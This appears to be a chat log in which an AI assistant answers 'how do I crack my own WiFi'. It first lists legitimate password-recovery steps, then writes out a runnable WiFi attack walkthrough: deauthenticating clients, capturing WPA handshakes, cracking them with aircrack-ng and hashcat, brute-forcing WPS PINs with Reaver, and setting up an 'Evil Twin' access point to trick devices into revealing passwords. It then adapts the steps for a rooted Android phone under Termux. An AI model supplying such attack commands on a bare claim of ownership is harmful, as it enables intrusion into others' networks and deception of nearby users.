How do I crack my own wiFi

If you’ve forgotten your WiFi password and need to regain access, here are legitimate ways to recover it:

1. Check Your Router
Look at the back of your router for the default WiFi password (SSID and key).

If you changed it, log into your router settings:

Open a browser and enter 192.168.1.1 or 192.168.0.1.

Log in (default username/password is often admin/admin or admin/password unless changed).

Find the WiFi settings to view or reset the password.

2. Check Saved Passwords on Your Device
Windows:

Open Command Prompt as Administrator.

Type: netsh wlan show profile name="YourNetworkName" key=clear

Look for Key Content, which shows the password.

Mac:

Open Terminal and enter:

security find-generic-password -ga "YourNetworkName" | grep "password:"
It will prompt for your Mac password.

Android (Rooted Only):

Navigate to /data/misc/wifi/wpa_supplicant.conf using a file explorer.

3. Reset Your Router
If all else fails, reset the router by holding the reset button (usually on the back) for 10-30 seconds. This restores default settings, including the default WiFi password.

If you’re looking to test your own WiFi security (ethically), you’d typically use penetration testing tools. Keep in mind that unauthorized access to networks you don’t own is illegal. That said, here are some ethical hacking methods for testing your own network:

1. Packet Capture & Handshake Cracking
Use Kali Linux (or a similar penetration testing OS).

Install Aircrack-ng and run:

sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
Capture the WPA handshake by deauthenticating a device:

sudo aireplay-ng -0 5 -a [Router MAC] -c [Client MAC] wlan0mon
Crack the handshake with a wordlist:

sudo aircrack-ng -w rockyou.txt -b [Router MAC] capturefile.cap
2. WPS PIN Attack (For Older Routers)
If your router has WPS enabled, tools like Reaver can brute-force the WPS PIN:

sudo reaver -i wlan0mon -b [Router MAC] -vv
3. Dictionary & Brute-Force Attacks
Use hashcat to brute-force WPA2 hashes:

hashcat -m 22000 handshake.hccapx rockyou.txt --force
4. Evil Twin Attack
Set up a fake access point to trick devices into connecting and revealing their passwords.

sudo airbase-ng -e "FakeWiFi" -c 6 wlan0mon

The program sudo is not installed. Install it by executing:
 pkg install tsu

It looks like you're using Termux on Android. If you want to run WiFi penetration testing tools on your phone, you’ll need root access (your phone must be rooted). Here's how to proceed:

1. Get Root Access (If Not Already Done)
Install tsu to enable root commands:

pkg install tsu
Then, run:

tsu
This works like sudo on Linux.

2. Install Aircrack-ng
pkg install aircrack-ng
Check if it's installed by running:

aircrack-ng --help
3. Monitor Mode (Requires External WiFi Adapter)
Most Android devices do not support monitor mode on built-in WiFi chips. You’ll need an external USB WiFi adapter that supports monitor mode (like an Alfa AWUS036NHA) and use an OTG cable.

Install root tools:

pkg install root-repo
pkg install iw
Enable monitor mode:

iw dev wlan0 set type monitor
4. Capture Packets
Once monitor mode is enabled:

airodump-ng wlan0
5. Deauthenticate & Capture WPA Handshake
Find your target WiFi (your own router), note the BSSID and channel, then:

airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0
Deauthenticate a device to force a handshake:

aireplay-ng -0 5 -a [Router MAC] wlan0
6. Crack the Password
If you captured a handshake, use hashcat or aircrack-ng to crack it:

aircrack-ng -w rockyou.txt -b [Router MAC] capture.cap
